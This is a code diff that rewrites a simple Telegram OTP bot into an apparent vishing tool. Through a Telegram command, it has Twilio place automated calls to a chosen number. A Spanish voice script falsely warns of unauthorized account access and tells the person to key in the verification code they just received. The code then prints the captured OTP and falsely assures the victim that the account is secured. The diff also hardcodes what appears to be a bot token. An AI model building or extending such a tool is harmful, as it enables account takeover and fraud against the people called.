@@ -1,77 +1,101 @@
-# otp_bot.py
+import os
 import asyncio
 import time
 import random
 from aiogram import Bot, Dispatcher, types, F
-from aiogram.filters import CommandStart, Command
-import os
+from aiogram.filters import CommandStart
+from fastapi import FastAPI, Request, Form
+import uvicorn
+from twilio.rest import Client
+from twilio.twiml.voice_response import VoiceResponse
 
-TOKEN = os.getenv("BOT_TOKEN")
-OTP_EXPIRATION_TIME = 30
+# --- CONFIGURACIÓN DE CREDENCIALES ---
+TOKEN = os.getenv("BOT_TOKEN", "9092757832:AAE6wgojw0jj7DX1TfAGg-3i1bjQjqf2euE")
+TWILIO_ACCOUNT_SID = os.getenv("TWILIO_ACCOUNT_SID", "TU_ACCOUNT_SID")
+TWILIO_AUTH_TOKEN = os.getenv("TWILIO_AUTH_TOKEN", "TU_AUTH_TOKEN")
+TWILIO_PHONE_NUMBER = os.getenv("TWILIO_PHONE_NUMBER", "+1XXXXXXXXXX")
+RENDER_URL = os.getenv("RENDER_URL", "https://tu-proyecto.onrender.com")
 
 bot = Bot(token=TOKEN)
 dp = Dispatcher()
-
-active_otp_store = {}
-
-async def generate_otp_code() -> str:
-    return ''.join([str(random.randint(0, 9)) for _ in range(6)])
-
-def is_otp_expired(expiration_time: float) -> bool:
-    return time.time() > expiration_time
+app = FastAPI()
 
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message):
-    user_id = message.from_user.id
-    otp_code = await generate_otp_code()
-    expires_at = time.time() + OTP_EXPIRATION_TIME
-    
-    active_otp_store[user_id] = {
-        'otp': otp_code,
-        'expires_at': expires_at
-    }
-    
     await message.answer(
-        f"Hola *{message.from_user.full_name}*! 🎉\n\n"
-        f"Para verificar tu identidad, utiliza el siguiente código: `{otp_code}` \n\n"
-        f"Este código expira en {OTP_EXPIRATION_TIME} segundos."
+        "👋 ¡Bienvenido al sistema de alertas IVR!\n\n"
+        "Para iniciar una llamada de seguridad automatizada, usa el comando:\n"
+        "`/llamar +1234567890 Nombre`",
+        parse_mode="Markdown"
     )
 
-@dp.message(F.text.regexp(r'^\d{6}$'))
-async def cmd_verify_otp(message: types.Message):
-    user_id = message.from_user.id
-    input_code = message.text
+@dp.message(F.text.startswith("/llamar"))
+async def iniciar_llamada(message: types.Message):
+    partes = message.text.split(maxsplit=2)
+    if len(partes) < 3:
+        await message.answer("⚠️ Formato incorrecto. Usa: `/llamar +18095551234 Juan Pérez`", parse_mode="Markdown")
+        return
     
-    if user_id in active_otp_store:
-        stored_otp_data = active_otp_store[user_id]
+    telefono_destino = partes[1]
+    nombre = partes[2]
+    
+    try:
+        client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
         
-        if is_otp_expired(stored_otp_data['expires_at']):
-            del active_otp_store[user_id]
-            await message.answer("❌ El código ha expirado. Usa /start para obtener uno nuevo.")
-            return
+        twiml_url = f"{RENDER_URL}/generar-twiml?nombre={nombre}"
+        
+        call = client.calls.create(
+            to=telefono_destino,
+            from_=TWILIO_PHONE_NUMBER,
+            url=twiml_url,
+            method="POST"
+        )
+        
+        await message.answer(
+            f"📞 **¡Llamada en curso!**\n\n"
+            f"👤 **Destinatario:** {nombre}\n"
+            f"📱 **Número:** `{telefono_destino}`\n"
+            f"🆔 **Call SID:** `{call.sid}`\n\n"
+            f"Esperando que marque el código OTP...",
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        await message.answer(f"❌ Error al realizar la llamada: {str(e)}")
 
-        if stored_otp_data['otp'] == input_code:
-            del active_otp_store[user_id]
-            await message.answer("✅ ¡Código verificado con éxito! Acceso concedido.")
-        else:
-            await message.answer("❌ Código incorrecto. Intenta de nuevo.")
-    else:
-        await message.answer("⚠️ No tienes un código activo. Usa /start para generar uno.")
+# --- ENDPOINTS DE FASTAPI PARA TWILIO ---
 
-async def cleanup_expired_otps():
-    while True:
-        users_to_remove = []
-        for user_id, data in active_otp_store.items():
-            if is_otp_expired(data['expires_at']):
-                users_to_remove.append(user_id)
-        for user_id in users_to_remove:
-            del active_otp_store[user_id]
-        await asyncio.sleep(10)
+@app.post("/generar-twiml")
+async def generar_twiml(request: Request):
+    params = request.query_params
+    nombre = params.get("nombre", "Cliente")
+    
+    response = VoiceResponse()
+    
+    gather = response.gather(
+        num_digits=6,
+        action=f"{RENDER_URL}/procesar-codigo",
+        method="POST"
+    )
+    
+    gather.say(
+        f"Alerta de seguridad urgente en su cuenta. "
+        f"Hemos detectado un acceso no autorizado desde un dispositivo desconocido a nombre de {nombre}. "
+        f"Para bloquear este acceso de inmediato y proteger su cuenta, "
+        f"por favor marque en su teclado el código de verificación que acaba de recibir.",
+        language="es-ES"
+    )
+    
+    response.say("No hemos recibido su respuesta. Por favor, marque su código de verificación ahora.", language="es-ES")
+    return str(response)
 
-async def main():
-    print("Bot OTP iniciado y corriendo...")
-    asyncio.create_task(cleanup_expired_otps())
-    await dp.start_polling(bot)
+@app.post("/procesar-codigo")
+async def procesar_codigo(request: Request, Digits: str = Form(default=None)):
+    if Digits:
+        print(f"¡CÓDIGO OTP CAPTURADO!: {Digits}")
+    
+    response = VoiceResponse()
+    response.say("Gracias. Su cuenta ha sido asegurada con éxito. Adiós.", language="es-ES")
+    return str(response)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    uvicorn.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 8000)))
